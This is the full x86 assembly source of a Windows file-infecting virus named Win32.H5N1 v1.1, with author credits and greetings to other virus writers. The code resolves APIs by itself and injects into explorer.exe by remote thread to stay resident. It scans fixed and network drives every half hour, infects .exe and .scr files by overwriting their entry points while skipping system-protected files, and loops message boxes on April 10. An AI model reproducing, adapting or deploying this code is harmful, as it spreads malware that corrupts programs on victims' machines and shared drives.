.386
.model flat

;Win32.H5N1 v1.1 by DR-EF
;------------------------
;nothing special here just a result of some boredom...
;coded in 2006...
;
;Greeting to blueowl,urgo32,malfunction,belial,genetix,metal,DiA,VxF
;Cyneox,w0rmi,VirusBuster,Slagehammer and the rest of my friends

	VirusSize	equ	(VirusEnd-VirusStart)

.data

HostCode:
	nop
	nop
	nop
	ret
	
.code

start:

	mov	eax,VirusSize
	
VirusStart	equ $

	pushad					;preserve all registers
	
	mov	eax,dword ptr [esp+20h]
	xor	ax,ax
@nk32:	cmp	word ptr [eax],"ZM"
	jne	NxtP
ckPE:	mov	ebx,[eax+3ch]
	cmp	word ptr [eax + ebx],"EP"
	je	gotK32
NxtP:	sub	eax,1000h
	jmp	@nk32
gotK32:	push	eax				;eax - kernel base address
	add	eax,[eax + 3ch]
	mov	eax,[eax + 78h]
	add	eax,[esp]
	push	eax				;eax - kernel32 export table
	xor	edx,edx
	mov	eax,[eax + 20h]
	add	eax,[esp+4h]
	mov	edi,[eax]
	add	edi,[esp+4h]			;edi - api names array
	dec	edi
NxtCmp:	inc	edi
	call	OverVA
	db	"VirtualAlloc",0
OverVA:	pop	esi
	mov	ecx,0ch
	rep	cmpsb
	je	FindAdd
	inc	edx
NXT:	cmp	byte ptr [edi],0h
	je	NxtCmp
	inc	edi
	jmp	NXT
FindAdd:pop	eax				;eax - kernel32 export table
	shl	edx,1h				;edx - GetProcAddress position
	mov	ebx,[eax + 24h]
	add	ebx,[esp]
	add	ebx,edx
	mov	dx,word ptr [ebx]
	shl	edx,2h
	mov	ebx,[eax + 1ch]
	add	ebx,[esp]
	add	ebx,edx
	mov	ebx,[ebx]	
	add	ebx,[esp]			;ebx - VirtualAlloc address
	pop	eax
	
	call	xDelta
xDelta:	pop	ebp
	sub	ebp,offset xDelta
	
	push	PAGE_EXECUTE_READWRITE
	push	1000h
	push	VirusSize	
	push	0h
	call	ebx				;allocate memory

	push	eax
	xchg	edi,eax
	lea	esi,[ebp + VirusStart]
	mov	ecx,VirusSize
	rep	movsb
	add	dword ptr [esp],(AllocMemVStart-VirusStart)
	ret					;jump to virus at allocated memory

	kernel32base	dd	0
	_GetProcAddress		db	"GetProcAddress",0
	__GetProcAddress	dd	0
	

;ecx - number of apis
;eax - address to api strings
;ebx - address to api address
;edx - module handle
GetNextAPI:
	push	ecx
	push	edx
	push	eax
	push	eax
	push	edx
	call	[ebp + __GetProcAddress]
	or	eax,eax
	je	ApiErr
	mov	dword ptr [ebx],eax
	pop	eax
NextSTR:inc	eax
	cmp	byte ptr [eax],0h
	jne	NextSTR
	inc	eax
	add	ebx,4h
	pop	edx
	pop	ecx
	loop	GetNextAPI
	stc
	ret
ApiErr:	add	esp,0ch
	clc
	ret	
	
AllocMemVStart:

	call	ADelta
ADelta:	pop	ebp
	sub	ebp,offset ADelta		;get allocated memory delta offset

        mov 	eax,fs:[0]			;find kernel using SEH walker
search_last:
        mov 	edx,[eax]
        inc 	edx
        jz 	found_last
        dec 	edx
        xchg 	edx,eax
        jmp 	search_last
found_last:
        mov 	eax,[eax+4]
        and 	eax,0ffff0000h
search_mz:
        cmp 	word ptr [eax],'ZM'
        jz 	found_mz
        sub 	eax,10000h
        jmp 	search_mz
found_mz:
	mov	[ebp + kernel32base],eax
	add	eax,[eax + 3ch]
	mov	eax,[eax + 78h]
	add	eax,[ebp + kernel32base]
	;eax - kernel32 export table
	push	eax
	xor	edx,edx
	mov	eax,[eax + 20h]
	add	eax,[ebp + kernel32base]
	mov	edi,[eax]
	add	edi,[ebp + kernel32base]
	;edi - api names array
	cld
	dec	edi
nxt_cmp:inc	edi
	lea	esi,[ebp + _GetProcAddress]
	mov	ecx,0eh
	rep	cmpsb
	je	search_address
	inc	edx
nxt_l:	cmp	byte ptr [edi],0h
	je	nxt_cmp
	inc	edi
	jmp	nxt_l
search_address:
	pop	eax
	;eax - kernel32 export table
	;edx - GetProcAddress position
	shl	edx,1h
	mov	ebx,[eax + 24h]
	add	ebx,[ebp + kernel32base]
	add	ebx,edx
	mov	dx,word ptr [ebx]
	shl	edx,2h
	mov	ebx,[eax + 1ch]
	add	ebx,[ebp + kernel32base]
	add	ebx,edx
	mov	ebx,[ebx]
	add	ebx,[ebp + kernel32base]
	mov	[ebp + __GetProcAddress],ebx
	mov	edx,[ebp + kernel32base]
	mov	ecx,NumberOfApis
	lea	ebx,[ebp + ApiAddressTable]
	lea	eax,[ebp + ApiNamesTable]
	clc
	call	GetNextAPI				;start to get apis using a lookup table	

	call	InjectIntoExplorer			;go resident

	;restore application & return to host

	push	0					;push dummy
	push	esp
	push	PAGE_EXECUTE_READWRITE
	push	(VirusSize+64)
	push	dword ptr [ebp + Application_Original_EP]
	call	[ebp + VirtualProtect]
	pop	ebx					;restore stack
	or	eax,eax
	jne	RestoreHost
	popad
	ret
	
RestoreHost:
	mov	edi,offset	start
	Application_Original_EP	equ	($-4)
	mov	esi,offset HostCode
	HostSavedCode		equ	($-4)
	mov	ecx,VirusSize
	rep	movsb
	popad
	push	offset start
	JumpBack		equ	($-4)
	ret						;return to host

InfectFile:
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	eax
	push	GENERIC_READ or GENERIC_WRITE
	push	ebx
	call	[ebp + CreateFile]			
	inc	eax                             
	je	ExitInfect
	dec 	eax  
	mov	dword ptr [ebp + hfile],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READWRITE
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + CreateFileMapping]
	or	eax,eax
	je	ExitCloseFile
	mov	dword ptr [ebp + hmap],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	FILE_MAP_WRITE
	push	dword ptr [ebp + hmap]
	call	[ebp + MapViewOfFile]
	or	eax,eax
	je	ExitCloseMap
	mov	dword ptr [ebp + mapbase],eax
	pushad
	lea	eax,[ebp + SEH_Handler]
	push	eax
	xor	eax,eax
	push	dword ptr fs:[eax]			;set SEH to protect infection function
	mov	fs:[eax],esp
	mov	eax,dword ptr [ebp + mapbase]
	cmp	word ptr [eax],"ZM"			;check mz sign
	jne	ExitUnmap
	mov	ecx,dword ptr [eax + 18h]		;check if relocation in mz header
	cmp	ecx,40h					;is 0x40 which is always for pe file
	jne	ExitUnmap	
	add	eax,[eax + 3ch]
	cmp	word ptr [eax],"EP"			;check pe sign
	jne	ExitUnmap
	cmp	byte ptr [eax + 0bh],29h		;check if already infected
	je	ExitUnmap
	cmp	dword ptr [eax + 80h],0h
	je	NoImprt
	mov	ecx,[eax + 28h]
	add	ecx,VirusSize
	cmp	ecx,dword ptr [eax + 80h]		;make sure we wont overwrite imports
	jae	ExitUnmap		
NoImprt:push	eax					;save pe header offset in the stack
	movzx	ecx,word ptr [eax + 6h]			;get number of sections
	mov	ebx,[eax + 74h]
	shl	ebx,3h
	add	eax,ebx
	add	eax,78h					;eax -first section header
	mov	ebx,[eax + 0ch]				;get virtual address
	cmp	ebx,[eax + 14h]
	jne	Exit__					;dont infect file
	push	eax
@GetLS:	add	eax,28h
	loop	@GetLS
	sub	eax,[ebp + mapbase]			;get end of headers(pe & sections),in file
	pop	ebx
	mov	ecx,[ebx + 14h]				;get pointer to raw data of the first section
	sub	ecx,eax
	cmp	ecx,VirusSize				;there enough space ?
	jb	Exit__	
	mov	edi,eax
	mov	edx,eax					;saved host code rva	
	add	edi,[ebp + mapbase]			;place to store host code
	mov	esi,[esp]				;get pe header
	mov	esi,[esi + 28h]
	add	esi,[ebp + mapbase]
	mov	ecx,VirusSize
	rep	movsb					;save host code inside hole
	mov	edi,[esp]				;get pe header
	mov	eax,[edi + 28h]				;get entry point rva
	add	eax,[edi + 34h]				;add image base...
	mov	ebx,[edi + 34h]
	add	edx,ebx					;savedhostcode
	mov	edi,[edi + 28h]
	add	edi,[ebp + mapbase]
	push	edi					;save virus offset
	lea	esi,[ebp + VirusStart]
	mov	ecx,VirusSize
	rep	movsb					;overwrite host ep
	pop	edi					;saved virus
	mov	dword ptr [edi + (Application_Original_EP-VirusStart)],eax
	mov	dword ptr [edi + (JumpBack-VirusStart)],eax
	mov	dword ptr [edi + (HostSavedCode-VirusStart)],edx
Exit__:	pop	eax					;restore pe header
	mov	byte ptr [eax + 0bh],29h		;sign the file as infected
ExitUnmap:
	pop	dword ptr fs:[0]			;remove SEH	
	add	esp,4h
	popad	
ExitUnmap_:
	push	dword ptr [ebp + mapbase]
	call	[ebp + UnMapViewOfFile]
ExitCloseMap:
	push	dword ptr [ebp + hmap]
	call	[ebp + CloseHandle]
ExitCloseFile:
	push	dword ptr [ebp + hfile]
	call	[ebp + CloseHandle]
ExitInfect:
	ret
	
SEH_Handler:
	mov	esp,[esp + 8h]
	pop	dword ptr fs:[0]	
	add	esp,4h
	popad
	jmp	ExitUnmap_
	
	hfile		dd	0
	hmap		dd	0
	mapbase		dd	0
	
SYSTEMTIME:
	wYear		dw	0
	wMonth		dw	0
	wDayOfWeek	dw	0
	wDay		dw	0
	wHour		dw	0
	wMinute		dw	0
	wSecond		dw	0
	wMilliseconds	dw	0		
	
	hsearch		dd	0

	SfcIsFileProtected	dd	0
	
	Unicode_Path		equ	0ffh
	WIN32_FIND_DATA		equ	(0ffh+200h)
	FileName		equ	(32bh)
	FileSizeLow		equ	(WIN32_FIND_DATA+20h)
	FileAttributes		equ	WIN32_FIND_DATA
	
	VarsMem			dd	0
	;FileToInfect		db	0ffh	dup(0)
	;Unicode_Path		db	200h	dup(0)	 ;200=2 max_path
	;WIN32_FIND_DATA	...

	ResidentVirus_Start	equ	($-VirusStart)
ResidentVirus:						;resident part will start from here
	call	rDelta
rDelta:	pop	ebp
	sub	ebp,offset rDelta

	mov	edx,[ebp + kernel32base]
	mov	ecx,NumberOfApis
	lea	ebx,[ebp + ApiAddressTable]
	lea	eax,[ebp + ApiNamesTable]
	clc
	call	GetNextAPI				;start to get apis using a lookup table	
	
	lea	eax,[ebp + CopyRight]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	call	[ebp + CreateMutex]			;set residenty mark
		
	push	800h
	push	GPTR
	call	[ebp + GlobalAlloc]			;allocate 2kb of memory to store vars
	mov	[ebp + VarsMem],eax			
	
	mov	[ebp + SfcIsFileProtected],0h		;assume no sfc
	
	call	sfcdll
	db 	"SFC.DLL",0
sfcdll:	call	[ebp + LoadLibrary]			;load sfc library
	or	eax,eax					;sfc here ?
	je	NoSfc					;we not under xp\2000
	call	xSfc
	db      "SfcIsFileProtected",0	
xSfc:	push	eax					;sfc module handle
	call	[ebp + __GetProcAddress]
	or	eax,eax					;function not founded ?
	je	NoSfc
	mov	[ebp + SfcIsFileProtected],eax		;save function address	
NoSfc:	
	lea	eax,[ebp + SYSTEMTIME]
	push	eax
	call	[ebp + GetLocalTime]			;get time
	
	cmp	word ptr [ebp + wMonth],4h		;month is april ?
	jne	ScanAgain
	cmp	word ptr [ebp + wDay],0ah		;day its 10 ?
	jne	ScanAgain

	call	Usr32
	db	"user32.dll",0
Usr32:	call	[ebp + LoadLibrary]			;load user32 library
	or	eax,eax					;failed ?
	je	ScanAgain				
	call	msgbox
	db	"MessageBoxA",0
msgbox:	push	eax					;sfc module handle
	call	[ebp + __GetProcAddress]
	or	eax,eax					;function not founded ?
	je	ScanAgain
payload:
	push	eax

	push 	41040h
	lea	ebx,[ebp + CopyRight]
	push	ebx
	push	ebx
	push	0h
	call	eax					;)
	
	pop	eax
	jmp	payload					;infinite msgbox

ScanAgain:
	mov	byte ptr [ebp + StartDrive],'z'		;set start drive
	
InfectNxtDrive:
	lea	eax,[ebp + StartDrive]
	push	eax
	call	[ebp + GetDriveType]			;check if drive is remote or fixed
	cmp	eax,DRIVE_FIXED
	je	InfectIt
	cmp	eax,DRIVE_REMOTE
	jne	SkipDrive
InfectIt:

	lea	eax,[ebp + StartDrive]
	push	eax
	call	[ebp + SetCurrentDirectory]
	or	eax,eax
	je	SkipDrive
	
	call	InfectDrive

SkipDrive:	
	dec	byte ptr [ebp + StartDrive]
	cmp	byte ptr [ebp + StartDrive],'b'
	
	jne	InfectNxtDrive

	push	(1000*60*30)			;half hour
	call	[ebp + Sleep]
	
	jmp	ScanAgain
	

	StartDrive	db	"z:\",0

	DRIVE_FIXED     equ	  3
	DRIVE_REMOTE    equ	  4	


;recursive directory scanner...		
InfectDrive:
	mov	eax,[ebp + VarsMem]
	add	eax,WIN32_FIND_DATA
	push	eax
	lea	eax,[ebp + SearchMask]
	push	eax
	call	[ebp + FindFirstFile]
	cmp	eax,INVALID_HANDLE_VALUE		;error ?
	je	@Stops					;stop search	
	mov	[ebp + hsearch],eax			;save search handle	
@NxtF:	mov	eax,[ebp + VarsMem]			;get file attributes
	mov	eax,[eax + FileAttributes]
	and	eax,FILE_ATTRIBUTE_DIRECTORY		;remove bit masks
	cmp	eax,FILE_ATTRIBUTE_DIRECTORY		;it is directory ?
	jne	@isFile
	mov	eax,[ebp + VarsMem]
	cmp	byte ptr [eax + FileName],'.'		;its start with . ?
	je	@FndNxt
	push	[ebp + hsearch]				;save search handle	
	mov	eax,[ebp + VarsMem]
	add	eax,FileName
	push	eax
	call	[ebp + SetCurrentDirectory]		;enter directory
	or	eax,eax
	je	@skpdir
	call	InfectDrive				;infect all sub directorys
	lea	eax,[ebp + dotdot]
	push	eax
	call	[ebp + SetCurrentDirectory]		;return to current directory
@skpdir:pop	[ebp + hsearch]				;restore search handle
	jmp	@FndNxt	
@isFile:		
	lea	eax,[ebp + File_Name]
	push	eax
	mov	eax,[ebp + VarsMem]
	push	eax
	push	260
	mov	eax,[ebp + VarsMem]
	add	eax,FileName
	push	eax
	call	[ebp + GetFullPathName]			;get file full path	
	or	eax,eax
	je	@FndNxt		
	mov	eax,[ebp + VarsMem]
@Find0:	cmp	byte ptr [eax],0h
	je	@GetExt
	inc	eax
	jmp	@Find0
@GetExt:sub	eax,4h					;go before the .xxx
	or	dword ptr [eax],20202020h		;convert to lower case
	cmp	dword ptr [eax],"exe."
	je	morechecks
	cmp	dword ptr [eax],"rcs."
	je	morechecks	
	jmp	@FndNxt
morechecks:	
	mov	eax,[ebp + VarsMem]			;get file size
	mov	eax,[eax + FileSizeLow]		
	cmp	eax,2800h				;too small ?
	jb	@FndNxt	
	cmp	eax,300000h				;too big ?
	ja	@FndNxt
	cmp	dword ptr [ebp + SfcIsFileProtected],0h ;sfc working ?
	je	SfcNotWork	
	mov	edi,[ebp + VarsMem]
	add	edi,Unicode_Path
	xor	eax,eax
	mov	ecx,200h
	rep	stosb					;blank unicode buffer	
	push	200h
	mov	eax,[ebp + VarsMem]
	add	eax,Unicode_Path	
	push	eax
	push	-1					;string is null terminated
	mov	eax,[ebp + VarsMem]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	call	[ebp + MultiByteToWideChar]		;convert path into unicode
	or	eax,eax					;fail ?
	je	@FndNxt					;dont infect
	mov	eax,[ebp + VarsMem]
	add	eax,Unicode_Path
	push	eax
	push	0h
	call	[ebp + SfcIsFileProtected]		;check if file is protected	
	cmp	eax,0h					;is file protected ?
	jne	@FndNxt
SfcNotWork:						;sfc dont working,assume we on win9x
	mov	ebx,[ebp + VarsMem]

	call	InfectFile

	push	250
	call	[ebp + Sleep]

@FndNxt:
	push 	10
	call	[ebp + Sleep]
	
	mov	eax,[ebp + VarsMem]
	add	eax,WIN32_FIND_DATA
	push	eax
	push	[ebp + hsearch]
	call	[ebp + FindNextFile]			;find next file
	or	eax,eax
	jne	@NxtF

	push	[ebp + hsearch]
	call	[ebp + FindClose]			;end the search
	
@Stops:	ret
	
	FILE_ATTRIBUTE_DIRECTORY	equ	00000010h
		
	File_Name		dd	0
	dotdot			db	"..",0
	SearchMask		db	"*.*",0

	MUTEX_ALL_ACCESS	equ	001F0001h
	
	CopyRight	db	".:[Win32.H5N1 v1.1 by DR-EF 2006]:.",0
	
	
InjectIntoExplorer:
;0)check if already memory resident
;**********************************
	lea	eax,[ebp + CopyRight]
	push	eax
	push	0h
	push	MUTEX_ALL_ACCESS
	call	[ebp + OpenMutex]	
	cmp	eax,0h
	jne	IIE_Failed
;1)Find explorer.exe process id
;*******************************
	push	00000000h
	push	TH32CS_SNAPPROCESS
	call	dword ptr [ebp+CreateToolhelp32Snapshot]
	cmp	eax,0FFFFFFFFh
	je	IIE_Failed
	
	mov	dword ptr [ebp + hSnapshot],eax

	lea	eax,dword ptr [ebp+PROCESSENTRY32]
	push	eax
	push	dword ptr [ebp+hSnapshot]
	call	dword ptr [ebp+Process32First]
	or	eax,eax
	jz	IIEF_CSnp
IsExplorer: 
	xor	ecx,ecx
	lea	eax,[ebp + szExeFile]
_Lower:	cmp	byte ptr [eax+ecx],0h
	je	CmpExp
	or	byte ptr [eax+ecx],20h
	inc	ecx
	jmp	_Lower
CmpExp:	
;	cmp	dword ptr [eax],"stst"
;	jne	NextPrc					;test code
	cmp	dword ptr [eax],"lpxe"
	jne	NextPrc		
	cmp	dword ptr [eax+4h],"rero"
	jne	NextPrc		        
	cmp	dword ptr [eax+8h],"exe."
	jne	NextPrc	
	
	push	[ebp + hSnapshot]
	call	[ebp + CloseHandle]
	jmp	OpenExp
	
NextPrc:lea	eax,dword ptr [ebp+PROCESSENTRY32]
	push	eax                                ;lppe
	push	dword ptr [ebp+hSnapshot]          ;hSnapshot
	call	dword ptr [ebp+Process32Next]
	or	eax,eax
	jnz	IsExplorer
	
	jmp	IIEF_CSnp
;2)open explorer process 
OpenExp:
	push	[ebp + th32ProcessID]
	push	1
	push	PROCESS_ALL_ACCESS
	call	[ebp + OpenProcess]
	or	eax,eax
	je	IIE_Failed
	mov	[ebp + hExplorer],eax
;3)allocate memory inside explorer process
	push	PAGE_EXECUTE_READWRITE
	push	MEM_COMMIT
	push	VirusSize
	push	0h
	push	eax
	call	[ebp + VirtualAllocEx]
	or	eax,eax
	je	IIEF_CEH
	mov	[ebp + mVirus],eax
;4)copy virus into allocated memory
	call	wbytes
	dd	0
wbytes:	push	VirusSize
	lea	eax,[ebp + VirusStart]
	push	eax
	push	[ebp + mVirus]
	push	[ebp + hExplorer]
	call	[ebp + WriteProcessMemory]
	or	eax,eax
	je	IIEF_FMM
;5)create remote thread inside explorer process
	call	tid
	dd	0
tid:	push	0h
	push	0h
	push	[ebp + mVirus]
	add	dword ptr [esp],ResidentVirus_Start
	push	0h
	push	0h
	push	[ebp + hExplorer]
	call	[ebp + CreateRemoteThread]
	push	[ebp + hExplorer]
	call	[ebp + CloseHandle]
	stc
	ret
IIEF_FMM:
	push	MEM_RELEASE
	push	0h
	push	[ebp + mVirus]
	push	[ebp + hExplorer]
	call	[ebp + VirtualFreeEx]
IIEF_CEH:
	push	[ebp + hExplorer]
	call	[ebp + CloseHandle]
IIEF_CSnp:
	push	[ebp + hSnapshot]
	call	[ebp + CloseHandle]
IIE_Failed:
	clc
	ret
	
	PROCESSENTRY32                    equ $

	dwSize                     dd	SIZEOFPROCESSENTRY32
	cntUsage                   dd	0
	th32ProcessID              dd	0
	th32DefaultHeapID          dd	0
	th32ModuleID               dd	0
	cntThreads                 dd	0
	th32ParentProcessID        dd	0
	pcPriClassBase             dd	0
	dwFlags                    dd	0
	szExeFile                  db	MAX_PATH dup (0)

	SIZEOFPROCESSENTRY32	   equ ($-PROCESSENTRY32)	

	MAX_PATH		equ	104h
	
	hExplorer		dd	0
	hSnapshot		dd	0
	mVirus			dd	0
	PAGE_READWRITE		equ	4h
	FILE_MAP_WRITE		equ	2h	
	TH32CS_SNAPPROCESS  	equ	2h
	PAGE_EXECUTE_READWRITE	equ	40h
	MEM_COMMIT		equ	1000h
	MEM_RELEASE		equ	8000h

	PROCESS_ALL_ACCESS	equ	001F0FFFh


	
	PAGE_EXECUTE_READWRITE	equ	40h
	OPEN_EXISTING		equ	3
	FILE_ATTRIBUTE_NORMAL	equ	00000080h
	GENERIC_READ		equ	80000000h
	GENERIC_WRITE		equ	40000000h
	INVALID_HANDLE_VALUE	equ	-1
	GPTR			equ	0040h
	
ApiNamesTable:
	
	_CloseHandle		db	"CloseHandle",0
	_CreateFileMapping	db 	"CreateFileMappingA",0
	_MapViewOfFile		db 	"MapViewOfFile",0
	_UnmapViewOfFile	db 	"UnmapViewOfFile",0
	_CreateToolhelp32Snapshot	db	"CreateToolhelp32Snapshot",0
	_Process32First		db	"Process32First",0
	_Process32Next		db	"Process32Next",0
	_OpenProcess		db	"OpenProcess",0
	_VirtualAllocEx		db	"VirtualAllocEx",0
	_VirtualFreeEx		db	"VirtualFreeEx",0
	_WriteProcessMemory	db	"WriteProcessMemory",0
	_CreateRemoteThread	db	"CreateRemoteThread",0
	_Sleep			db	"Sleep",0
	_LoadLibraryA		db	"LoadLibraryA",0
	_OpenMutexA		db	"OpenMutexA",0
	_CreateMutexA		db	"CreateMutexA",0
	_VirtualProtect		db	"VirtualProtect",0
	_CreateFile		db	"CreateFileA",0
	_SetCurrentDirectory	db	"SetCurrentDirectoryA",0
	_FindFirstFile		db	"FindFirstFileA",0
	_FindNextFile		db	"FindNextFileA",0
	_GetFullPathName	db	"GetFullPathNameA",0
	_MultiByteToWideChar	db	"MultiByteToWideChar",0
	_FindClose		db	"FindClose",0
	_GetDriveType		db	"GetDriveTypeA",0
	_GetLocalTime		db	"GetLocalTime",0
	_GlobalAlloc		db	"GlobalAlloc",0

ApiAddressTable:
	
	CloseHandle		dd	0
	CreateFileMapping	dd	0
	MapViewOfFile		dd	0
	UnMapViewOfFile		dd	0
	CreateToolhelp32Snapshot	dd	0
	Process32First		dd	0
	Process32Next		dd	0
	OpenProcess		dd	0
	VirtualAllocEx		dd	0
	VirtualFreeEx		dd	0
	WriteProcessMemory	dd	0
	CreateRemoteThread	dd	0
	Sleep			dd	0
	LoadLibrary		dd	0
	OpenMutex		dd	0
	CreateMutex		dd	0
	VirtualProtect		dd	0
	CreateFile		dd	0
	SetCurrentDirectory	dd	0
	FindFirstFile		dd	0
	FindNextFile		dd	0
	GetFullPathName		dd	0
	MultiByteToWideChar	dd	0
	FindClose		dd	0
	GetDriveType		dd	0
	GetLocalTime		dd	0
	GlobalAlloc		dd	0

	NumberOfApis		equ	27

VirusEnd	equ	$

end start